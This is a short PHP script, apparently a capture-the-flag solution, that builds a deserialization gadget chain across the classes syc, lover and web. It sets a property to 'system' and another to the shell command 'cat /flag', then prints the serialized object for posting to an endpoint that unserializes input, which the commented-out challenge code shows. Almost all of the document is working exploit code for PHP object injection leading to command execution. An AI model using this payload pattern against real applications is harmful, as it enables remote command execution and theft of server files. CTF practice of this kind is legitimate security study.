<?php
class syc
{
    public $cuit;
    // public function __destruct()
    // {
    //     echo("action!<br>");
    //     $function=$this->cuit;
    //     return $function();
    // }
}

class lover
{
    public $yxx;
    public $QW;
    // public function __invoke()
    // {
    //     echo("invoke!<br>");
    //     return $this->yxx->QW;
    // }

}

class web
{
    public $eva1;
    public $interesting;

    // public function __get($var)
    // {
    //     echo("get!<br>");
    //     $eva1=$this->eva1;
    //     $eva1($this->interesting);
    // }
}
// if (isset($_POST['url'])) 
// {
//     unserialize($_POST['url']);
// }
$a=new syc;
$a->cuit=new lover;
$a->cuit->yxx=new web;
$a->cuit->yxx->eva1="system";
$a->cuit->yxx->interesting="cat /flag";
echo(serialize($a));